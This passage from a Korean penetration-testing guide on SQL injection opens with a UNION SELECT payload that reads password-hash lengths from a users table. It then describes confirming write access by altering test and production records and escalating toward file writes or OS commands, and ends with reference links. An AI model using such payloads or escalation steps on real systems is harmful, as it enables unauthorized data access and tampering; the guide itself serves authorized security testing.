' UNION SELECT NULL,CONCAT('password_hash_len=',LENGTH(password_hash)),NULL
  FROM users
  WHERE id=<TEST_USER_ID>
  LIMIT 1-- -
```

컬럼명이 다르면 실제 스키마에 맞춰 바꾼다. 대량 조회 전에는 count와 제한 샘플로 먼저 데이터 성격을 확인하고, 토큰·비밀번호 해시 원문 조회는 별도 승인 범위로 분리한다.

### 쓰기 가능성 확인

쓰기 가능성은 실제 영향으로 확인한다. 우선순위는 테스트 레코드, 영향 낮은 실데이터, 운영 데이터 순이다.

```text
테스트 계정의 표시명 변경
테스트 게시글 제목 변경
임시 테이블/임시 row 생성
```

운영 데이터 `UPDATE`는 복구 가능성과 영향 범위를 확인한 뒤 진행한다. DB에서 파일 쓰기나 OS 명령 실행으로 확장 가능한 단서가 보이면 다음 단계로 이어서 확인한다.

---

## 참고자료

### 공식 및 테스트 가이드

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger - SQL injection](https://portswigger.net/web-security/sql-injection)
- [MySQL - Flow Control Functions (`CASE`)](https://dev.mysql.com/doc/refman/8.4/en/flow-control-functions.html)
- [MySQL - Comparison Functions and Operators (`BETWEEN`)](https://dev.mysql.com/doc/refman/8.4/en/comparison-operators.html)
- [PostgreSQL - Conditional Expressions (`CASE`)](https://www.postgresql.org/docs/current/functions-conditional.html)
- [PostgreSQL - Comparison Functions and Operators (`BETWEEN`)](https://www.postgresql.org/docs/current/functions-comparison.html)
- [Microsoft Learn - `CASE` (Transact-SQL)](https://learn.microsoft.com/en-us/sql/t-sql/language-elements/case-transact-sql)
- [Microsoft Learn - `BETWEEN` (Transact-SQL)](https://learn.microsoft.com/en-us/sql/t-sql/language-elements/between-transact-sql)
- [Oracle Database - `CASE` Expressions](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/CASE-Expressions.html)
- [Oracle Database - `BETWEEN` Condition](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/BETWEEN-Condition.html)
- [SQLite - SQL Language Expressions (`BETWEEN`, `CASE`)](https://www.sqlite.org/lang_expr.html)

### 커뮤니티 참고 / 도구

- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [sqlmap 공식 문서](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
- [HackTricks - SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
